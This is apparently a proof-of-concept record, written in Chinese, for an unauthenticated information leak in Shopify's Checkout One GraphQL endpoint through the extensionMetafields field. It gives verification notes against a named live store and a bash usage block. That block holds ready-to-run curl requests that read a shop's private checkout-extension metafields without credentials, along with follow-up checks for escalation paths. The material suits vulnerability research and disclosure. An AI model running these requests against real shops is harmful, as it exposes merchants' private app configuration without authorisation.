# Shopify Checkout GraphQL Query.extensionMetafields 字段级未鉴权：零凭据读取全店 checkout 扩展私有 metafields（含可用性天花板）

- **code**: shopify-checkout-graphql-query.extensionmetafields-字段级未鉴权-零凭
- **kind**: poc
- **category**: info-leak
- **component**: Shopify Checkout One GraphQL（/checkouts/unstable/graphql，Query.extensionMetafields）
- **severity**: medium
- **language**: bash
- **source**: self
- **verified**: 1
- **verified_note**: finding#160（task#7，status=confirmed）。2026-11-11 20:18–20:23 UTC 本机 python3 requests（经平台记录代理，单线程间隔4s，零 Cookie/零 X-Checkout-One-Session-Token/零 build-id）复测：www POST /checkouts/unstable/graphql {"query":"{extensionMetafields{namespace key value type}}"} → 200/173013B/17条（sha256 404c054391603743，与上报件逐字节一致）；collect 同 body → 200/44846B/13条。对照：同名 metafields 经公开 Storefront API /api/2026-04/graphql.json 匿名读取 → ACCESS_DENIED「Required access: unauthenticated_read_metafields access scope」；同端点 {session{__typename}} → INVALID_SESSION_TOKEN。全量 value 敏感键/PII 扫描 0 命中；checkoutExtensionSessionToken 三种 extensionType 均 null；resourceIds 参数被忽略。
- **tags**: shopify,checkout-graphql,metafields,unauth,info-leak,extensionMetafields
- **created_at**: 2026-11-11T20:25:06.157Z
- **engine**: https://www.thegamecollection.net; https://collect.thegamecollection.net

## 描述

Shopify 托管店（含自定义域）的 Checkout One GraphQL 端点存在字段级鉴权豁免：extensionMetafields 无需任何会话/令牌即返回该店全部 checkout UI 扩展注册的私有 metafields（app 配置原文）。数据可能含第三方 app 的配置、模板清单与“签名因子”（如 Order Printer Pro security_multiplier）、功能开关、翻译，但实测不含 API key/token/secret/PII，且不扩散到可写字段或 token 铸造字段，属信息泄露天花板。

## 用法

```
前置：任意 Shopify 店域可访问；零凭据；单线程、请求间隔 ≥3s。
# 1) 零凭据读取全店扩展 metafields（关键请求）
curl -sk -X POST 'https://<shop>/checkouts/unstable/graphql' -H 'Content-Type: application/json' -H 'Accept: application/json' --data '{"query":"{extensionMetafields{namespace key value type}}"}'
# 2) 对照：证明非公开（应 ACCESS_DENIED）
curl -sk -X POST 'https://<shop>/api/2026-04/graphql.json' -H 'Content-Type: application/json' --data '{"query":"{shop{metafields(identifiers:[{namespace:\"<ns>\",key:\"<key>\"}]){namespace key value}}}"}'
# 3) 对照：证明字段级豁免（同端点其它字段应 INVALID_SESSION_TOKEN）
curl -sk -X POST 'https://<shop>/checkouts/unstable/graphql' -H 'Content-Type: application/json' --data '{"query":"{session{__typename}}"}'
# 4) 升级面快速判据（均阴性则按信息泄露收口）
#   - resourceIds 被忽略：{"query":"{extensionMetafields(resourceIds:[\"gid://shopify/Customer/1\"]){namespace key value type}}"}
#   - 无会话不铸 token：{"query":"{checkoutExtensionSessionToken(appId:\"gid://shopify/App/<id>\",extensionType:ACTIVATED){value expiresIn}}"} → null
#   - 泄露数据若为 Order Printer Pro：检查模板 enabled_for_order_status_page/enabled_for_thank_you_page 是否 false，并测 GET /apps/download-pdf → 404 即无客户下载面
```
